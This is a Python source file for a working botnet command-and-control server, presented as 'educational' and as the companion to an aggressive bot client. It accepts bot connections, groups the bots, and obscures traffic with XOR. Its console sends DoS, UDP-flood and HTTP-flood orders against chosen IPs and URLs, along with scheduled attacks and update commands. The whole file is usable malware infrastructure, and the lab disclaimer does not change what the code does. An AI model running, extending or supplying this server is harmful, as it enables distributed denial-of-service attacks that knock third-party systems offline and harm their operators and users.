# c2_server.py - Enhanced for Educational Purposes (Final Consolidation)
# WARNING: For educational use in isolated labs ONLY. Not for real-world use.
# Companion to the aggressive, multi-threaded bot.py
import socket
import threading
import time
import logging
import json

# --- Configuration ---
HOST = '0.0.0.0'  # Listen on all available interfaces (e.g., Kali VM IP)
PORT = 9999
# Ensure this key matches the bot's key exactly
SECRET_KEY = b"MySuperSecretKey123" # Simple XOR 'encryption' - NOT SECURE FOR REAL USE
# --- --- --- --- --- ---

logging.basicConfig(level=logging.INFO, format='%(asctime)s - C2 - %(levelname)s - %(message)s')

# Bot Management: Store bots with IDs and group info
# bot_id: { 'socket': socket_obj, 'address': addr, 'group': group_name, 'info': {} }
connected_bots = {}
bots_lock = threading.Lock()
bot_id_counter = 0

# Simple XOR 'encryption' - Inadequate for real-world use. Use TLS.
# Demonstrates the concept of obscuring traffic, not true security.
def encrypt_decrypt(data):
    key_len = len(SECRET_KEY)
    return bytes([data[i] ^ SECRET_KEY[i % key_len] for i in range(len(data))])

# Function to send a command to a specific bot or group
def send_command(target_specifier, command_str):
    """ Sends a command to a specific bot_id or a group name ('ALL', 'GROUP:<name>', <id>). """
    targets = []
    target_description = "" # For logging

    with bots_lock:
        # Make a safe copy of items to check against target specifier
        current_bots_items = list(connected_bots.items())

    # Determine target sockets based on specifier
    if target_specifier.upper() == "ALL":
        targets = [b_data['socket'] for b_id, b_data in current_bots_items]
        target_description = f"ALL ({len(targets)} bots)"
    elif target_specifier.startswith("GROUP:"):
        group_name = target_specifier.split(":", 1)[1]
        targets = [b_data['socket'] for b_id, b_data in current_bots_items if b_data['group'] == group_name]
        target_description = f"GROUP '{group_name}' ({len(targets)} bots)"
    else: # Assume it's a specific bot ID
        try:
            bot_id = int(target_specifier)
            found = False
            for b_id, b_data in current_bots_items:
                if b_id == bot_id:
                    targets = [b_data['socket']]
                    target_description = f"Bot ID {bot_id} ({b_data['address'][0]})"
                    found = True
                    break
            if not found:
                 logging.warning(f"Bot ID {bot_id} not found.")
                 return 0, 0 # Sent, Failed
        except ValueError:
             logging.error(f"Invalid target specifier: {target_specifier}. Use 'ALL', 'GROUP:<name>', or Bot ID.")
             return 0, 0

    if not targets:
        logging.warning(f"No targets found for specifier '{target_specifier}'.")
        return 0, 0

    logging.info(f"[CMD] Sending to {target_description}: {command_str}")
    sent_to = 0
    failed = 0
    bots_to_remove_ids = [] # Store IDs of bots that fail

    try:
        encrypted_cmd = encrypt_decrypt(command_str.encode())
    except Exception as e:
        logging.error(f"Failed to encrypt command '{command_str}': {e}")
        return 0, len(targets) # 0 sent, all failed assumption

    # Send to the identified target sockets
    # Need to map sockets back to IDs if removal is needed
    socket_to_id = {b_data['socket']: b_id for b_id, b_data in current_bots_items}

    for bot_socket in targets:
         try:
            bot_socket.sendall(encrypted_cmd)
            sent_to += 1
         except socket.error as e:
            bot_id = socket_to_id.get(bot_socket, None)
            logging.warning(f"Failed to send to Bot ID {bot_id}: {e}. Marking for removal.")
            failed += 1
            if bot_id is not None: bots_to_remove_ids.append(bot_id)
         except Exception as e:
             bot_id = socket_to_id.get(bot_socket, None)
             logging.error(f"Unexpected error sending to Bot ID {bot_id}: {e}")
             failed += 1
             if bot_id is not None: bots_to_remove_ids.append(bot_id)

    # Remove bots that failed after iteration
    if bots_to_remove_ids:
        with bots_lock:
            for bot_id in set(bots_to_remove_ids): # Use set to avoid duplicates
                if bot_id in connected_bots:
                    logging.info(f"Removing unresponsive bot: ID {bot_id} ({connected_bots[bot_id]['address']})")
                    try:
                        connected_bots[bot_id]['socket'].close()
                    except socket.error: pass # Ignore errors on close
                    del connected_bots[bot_id]

    logging.info(f"[CMD] Command '{command_str}' attempt complete. Sent to {sent_to} targets, {failed} failed.")
    return sent_to, failed


def handle_bot(bot_socket, bot_address):
    """ Handles connection, assignment, and basic keep-alive for a single bot. """
    global connected_bots, bot_id_counter
    bot_id = -1 # Assign invalid ID initially

    try:
        # Assign Bot ID and add to tracking dictionary
        with bots_lock:
            bot_id_counter += 1
            bot_id = bot_id_counter
            connected_bots[bot_id] = {
                'socket': bot_socket,
                'address': bot_address,
                'group': 'default', # Assign to default group initially
                'info': {'status': 'connected', 'os': 'unknown'} # Placeholder info
            }
        logging.info(f"[+] Bot connected: ID {bot_id} from {bot_address}, Group: default")

        # Main loop: Listens passively or handles keep-alives.
        # Assumes bot sends data only when commanded (or for initial registration).
        while True:
            # Basic Keep-Alive Check (Optional)
            time.sleep(30) # Check every 30 seconds
            try:
                 bot_socket.sendall(encrypt_decrypt(b'PING'))
                 # Could wait for PONG here if needed
            except socket.error as e:
                 logging.warning(f"[-] Ping failed for Bot ID {bot_id}. Connection likely lost: {e}")
                 break # Exit loop if send fails

    # Handle expected connection errors (disconnect)
    except (socket.error, ConnectionResetError, BrokenPipeError) as e:
        logging.warning(f"[-] Connection error with Bot ID {bot_id} ({bot_address}): {e}")
    # Handle unexpected errors
    except Exception as e:
        logging.error(f"[-] Unexpected error with Bot ID {bot_id} ({bot_address}): {e}", exc_info=True)
    # Cleanup: Runs on disconnect or error
    finally:
        logging.info(f"[-] Bot disconnected: ID {bot_id} ({bot_address})")
        with bots_lock:
            if bot_id in connected_bots:
                try:
                    connected_bots[bot_id]['socket'].close()
                except (socket.error, Exception): pass
                del connected_bots[bot_id]
        if 'bot_socket' in locals() and bot_socket.fileno() != -1:
             try: bot_socket.close()
             except: pass


def c2_interface():
    """ Provides the command-line interface for managing the C2 server. """
    print("\n--- C2 Command Interface (v2 - For Aggressive Bot) ---")
    print("Targets: ALL, GROUP:<name>, <bot_id>")
    print("Commands:")
    print("  LIST                 - List connected bots and groups")
    print("  GROUP <bot_id> <group_name> - Assign bot to a group")
    print("  INFO <target>        - Request basic info from target(s)")
    print("  DOS <target> <ip> <port> - Send AGGRESSIVE DoS command")
    print("  UDP <target> <ip> <port> <size> - Send AGGRESSIVE UDP Flood command")
    print("  HTTP <target> <url>  - Send AGGRESSIVE HTTP Flood command")
    print("  SCHEDULE <target> <HH:MM:SS> <command...> - Tell bot to schedule command (bot-side)")
    print("  UPDATE <target> <url>  - Tell bot to SIMULATE self-update from URL")
    print("  EXIT <target>        - Command target bot(s) to exit")
    print("  QUIT                 - Shutdown C2 server")
    print("-------------------------------------------------")
    print("[!] Ensure target environment firewalls allow C2<->Bot traffic on port", PORT)
    print("[!] WARNING: Attack commands trigger multi-threaded, high-intensity attacks on bots.")

    while True:
        try:
            cmd_input = input("C2> ").strip()
            if not cmd_input: continue

            parts = cmd_input.split()
            command = parts[0].upper()

            # --- Commands without Target Specifier ---
            if command == 'LIST':
                with bots_lock:
                    if not connected_bots:
                        print("  No bots connected.")
                    else:
                        print(f"  Connected bots ({len(connected_bots)}):")
                        groups = {}
                        sorted_bot_items = sorted(connected_bots.items())
                        for bid, data in sorted_bot_items:
                            grp = data['group']
                            if grp not in groups: groups[grp] = []
                            status = data.get('info', {}).get('status', 'N/A')
                            os_info = data.get('info', {}).get('os', 'N/A')
                            # Add worker count if bot reported it
                            workers = data.get('info', {}).get('attack_workers_setting', 'N/A')
                            groups[grp].append(f"ID {bid} ({data['address'][0]}:{data['address'][1]}) Grp:{grp} St:{status} OS:{os_info} Workers:{workers}")

                        sorted_groups = sorted(groups.items())
                        for grp, bots_in_group in sorted_groups:
                             print(f"    Group '{grp}':")
                             for bot_str in bots_in_group:
                                 print(f"      - {bot_str}")
                continue

            if command == 'GROUP' and len(parts) == 3:
                 try:
                     bot_id_to_group = int(parts[1])
                     new_group = parts[2]
                     with bots_lock:
                         if bot_id_to_group in connected_bots:
                             old_group = connected_bots[bot_id_to_group]['group']
                             connected_bots[bot_id_to_group]['group'] = new_group
                             print(f"  Bot ID {bot_id_to_group} moved from group '{old_group}' to '{new_group}'.")
                         else:
                             print(f"  Bot ID {bot_id_to_group} not found.")
                 except ValueError:
                      print("  Usage: GROUP <bot_id> <group_name>")
                 continue

            if command == 'QUIT':
                 logging.info("[+] Shutting down C2 server...")
                 send_command("ALL", "EXIT")
                 print("  Sent EXIT command to all bots. Waiting briefly...")
                 time.sleep(2)
                 with bots_lock:
                     print(f"  Closing remaining {len(connected_bots)} bot sockets...")
                     sockets_to_close = [b['socket'] for b in connected_bots.values()]
                     for bot_socket in sockets_to_close:
                         try: bot_socket.close()
                         except socket.error: pass
                 connected_bots.clear()
                 print("  Signaling server socket to close...")
                 try:
                     shutdown_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     connect_host = '127.0.0.1' if HOST == '0.0.0.0' else HOST
                     shutdown_socket.connect((connect_host, PORT))
                     shutdown_socket.close()
                     print("  Shutdown signal sent.")
                 except Exception as e:
                     logging.error(f"Error signaling shutdown via connection: {e}")
                 break

            # --- Commands Requiring a Target Specifier ---
            if len(parts) < 2:
                print(f"  Command '{command}' requires a target (ALL, GROUP:<name>, <bot_id>).")
                continue

            target = parts[1]
            cmd_args = parts[2:] # Remaining parts are command arguments

            bot_command_str = ""
            if command == 'INFO':
                if len(cmd_args) == 0: bot_command_str = "INFO_REQUEST"
                else: print("  Usage: INFO <target>"); continue
            elif command == 'DOS' and len(cmd_args) == 2:
                 ip, port = cmd_args[0], cmd_args[1]
                 try: socket.inet_aton(ip); int(port)
                 except (OSError, ValueError): print(f"  Invalid IP ({ip}) or port ({port})."); continue
                 bot_command_str = f"DOS {ip} {port}"
            elif command == 'UDP' and len(cmd_args) == 3:
                 ip, port, size = cmd_args[0], cmd_args[1], cmd_args[2]
                 try: socket.inet_aton(ip); int(port); int(size)
                 except (OSError, ValueError): print(f"  Invalid IP ({ip}), port ({port}), or size ({size})."); continue
                 bot_command_str = f"UDP {ip} {port} {size}"
            elif command == 'HTTP' and len(cmd_args) == 1:
                 url = cmd_args[0]
                 if not url.startswith(('http://', 'https://')): print(f"  URL ({url}) should start with http:// or https://"); continue
                 bot_command_str = f"HTTP {url}"
            elif command == 'SCHEDULE' and len(cmd_args) >= 2:
                 time_spec = cmd_args[0]
                 actual_command = " ".join(cmd_args[1:])
                 try: time.strptime(time_spec, '%H:%M:%S')
                 except ValueError: print(f"  Invalid time format ({time_spec}). Use HH:MM:SS."); continue
                 if not actual_command.upper().split()[0] in ['DOS', 'UDP', 'HTTP', 'EXIT', 'INFO_REQUEST']:
                      print(f"  Cannot schedule unknown command: {actual_command.split()[0]}")
                      continue
                 bot_command_str = f"SCHEDULE {time_spec} {actual_command}"
                 print(f"  Sending schedule command to bot(s). Bot handles execution at {time_spec}.")
            elif command == 'UPDATE' and len(cmd_args) == 1:
                 update_url = cmd_args[0]
                 if not update_url.startswith(('http://', 'https://')): print(f"  Update URL ({update_url}) should start with http:// or https://"); continue
                 bot_command_str = f"UPDATE {update_url}"
                 print(f"  Sending simulated update command to bot(s) for URL: {update_url}")
            elif command == 'EXIT':
                 if len(cmd_args) == 0: bot_command_str = "EXIT"
                 else: print("  Usage: EXIT <target>"); continue
            else:
                 print(f"  Unknown command '{command}' or invalid arguments for target.")
                 continue

            if bot_command_str:
                send_command(target, bot_command_str)
            else:
                 print(f"  Command '{command}' processed, but no valid action generated.")

        except EOFError: print("\nUse QUIT command to exit.")
        except KeyboardInterrupt: print("\nUse QUIT command to exit.")
        except Exception as e:
            logging.error(f"[C2 Interface Error] {e}", exc_info=True)
            print(f"  An unexpected error occurred: {e}")

    print("C2 interface loop terminated.")


def accept_connections(server_socket):
    """ Listens for and accepts incoming bot connections. """
    logging.info("Connection acceptor thread started.")
    try:
        while True:
            try:
                client_sock, addr = server_socket.accept()
                logging.debug(f"Accepted connection from {addr}")
                # Add IP filtering/basic auth here if needed
                thread = threading.Thread(target=handle_bot, args=(client_sock, addr), daemon=True)
                thread.start()
            except socket.error as e:
                logging.info(f"Server socket accept loop ending (accept failed): {e}")
                break # Exit loop if socket is closed or errors
            except Exception as e:
                 logging.error(f"Error accepting connection: {e}", exc_info=True)
                 time.sleep(1)
    finally:
        logging.info("Connection acceptance stopped.")


def main():
    """ Main function to set up and run the C2 server. """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logging.info(f"[+] C2 server listening on {HOST}:{PORT}...")
        print(f"[+] C2 server listening on {HOST}:{PORT}...")
    except Exception as e:
        logging.critical(f"[-] Failed to bind C2 server to {HOST}:{PORT}: {e}")
        print(f"[-] Fatal Error: Could not bind to {HOST}:{PORT}. Error: {e}")
        return

    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,), daemon=True)
    accept_thread.start()

    c2_interface() # Run C2 interface in main thread

    logging.info("Closing server socket.")
    print("Closing server socket...")
    try:
        # Try to gracefully shutdown read/write ends before closing
        server_socket.shutdown(socket.SHUT_RDWR)
    except OSError as e: # May error if socket already closed
        logging.debug(f"Socket shutdown error (may be already closed): {e}")
    except Exception as e:
        logging.error(f"Unexpected error during socket shutdown: {e}")
    finally:
        try: server_socket.close() # Ensure close is called
        except Exception as e: logging.error(f"Unexpected error during final socket close: {e}")

    logging.info("C2 server shutdown sequence complete.")
    print("C2 server shutdown complete.")


if __name__ == "__main__":
    main()